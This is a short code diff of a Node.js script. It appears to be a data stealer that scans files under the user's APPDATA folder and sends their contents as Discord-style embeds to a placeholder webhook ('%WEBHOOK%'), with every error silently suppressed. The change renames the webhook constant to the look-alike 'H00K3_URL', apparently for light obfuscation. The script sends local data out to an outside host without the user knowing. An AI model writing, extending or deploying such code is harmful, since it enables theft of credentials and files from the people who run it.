@@ -2,7 +2,8 @@ const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
 
-const HOOK3_URL = "%WEBHOOK%";
+
+const H00K3_URL = "%WEBHOOK%";
 
 const customAvatarUrl = 'https://i.imgur.com/83uCFZe.jpeg';
 const appData = process.env.APPDATA;
@@ -71,7 +72,7 @@ files.forEach(fileName => {
                         embeds: [embed]
                     };
 
-                    axios.post(HOOK3_URL, payload).catch(() => {});
+                    axios.post(H00K3_URL, payload).catch(() => {});
                 }
             }
         } catch (err) {}
